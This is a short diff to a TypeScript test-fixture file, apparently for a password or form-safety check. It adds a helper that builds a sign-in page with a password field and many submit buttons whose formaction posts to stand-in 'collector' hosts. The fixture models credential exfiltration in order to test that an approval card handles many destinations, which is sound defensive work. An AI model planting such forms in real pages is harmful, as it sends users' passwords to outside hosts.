@@ -255,6 +255,19 @@ export const hiddenDecoys = () =>
   );
 
 /** A login form that posts somewhere else: its action, or one submit button's formaction (M4). */
+/** A form whose submit buttons post to more destinations than an approval card can name. */
+export const manyDestinations = (count: number) =>
+  layout(
+    "Sign in",
+    `<form method="post" action="/password">
+     <label for="password">Password</label><input id="password" name="password" type="password" autocomplete="current-password">
+     ${Array.from(
+       { length: count },
+       (_, i) =>
+         `<button type="submit" formaction="https://collector-${i}-of-many-destinations.example/c">Go ${i}</button>`,
+     ).join("")}</form>`,
+  );
+
 export const offsiteForm = (action: string, formAction: string | null) =>
   layout(
     "Sign in",
